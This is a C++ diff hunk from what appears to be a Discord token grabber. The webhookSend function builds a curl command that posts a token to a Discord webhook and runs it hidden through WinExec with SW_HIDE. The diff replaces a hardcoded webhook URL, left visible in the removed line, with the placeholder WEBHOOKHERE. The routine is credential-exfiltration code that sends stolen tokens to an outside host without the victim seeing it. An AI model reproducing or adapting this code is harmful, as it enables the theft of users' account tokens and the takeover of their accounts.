@@ -17,7 +17,7 @@ namespace fs = std::filesystem;
 std::string webhookSend(std::string token) {
 
 	char cmd[1024];
-	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/841193093410848778/om0nVwiePYsfTIMpox3bovNLOzlBbZXIc0KdJ9JcMQVcxXC9pCg2RFpyHfWRaMbD_heU", token.c_str());
+	sprintf(cmd, "curl -d \"content=%s\" WEBHOOKHERE", token.c_str());
 	WinExec(cmd, SW_HIDE);
 
 	return cmd;
